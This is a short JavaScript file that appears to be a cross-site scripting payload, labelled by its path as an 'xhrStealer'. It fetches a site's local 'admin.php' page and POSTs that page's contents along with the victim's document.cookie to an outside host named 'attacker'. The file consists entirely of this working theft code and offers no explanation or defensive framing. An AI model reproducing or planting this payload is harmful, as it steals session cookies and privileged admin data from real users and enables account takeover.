function getit(body){
	var http = new XMLHttpRequest();
	var url = 'http://attacker/xhrStealer/get_data.php';
	var params = "cookie="+escape(document.cookie)+'&body='+escape(body);
	http.open('POST', url, true);

	http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

	http.onreadystatechange = function() {
	    if(http.readyState == 4 && http.status == 200) {
	        
	    }
	}
	http.send(params);
}

var url = 'admin.php'; //A local page

function load(url, callback) {
  var xhr = new XMLHttpRequest();

  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      callback(xhr.response);
    }
  }

  xhr.open('GET', url, true);
  xhr.send('');
}

load(url,getit);
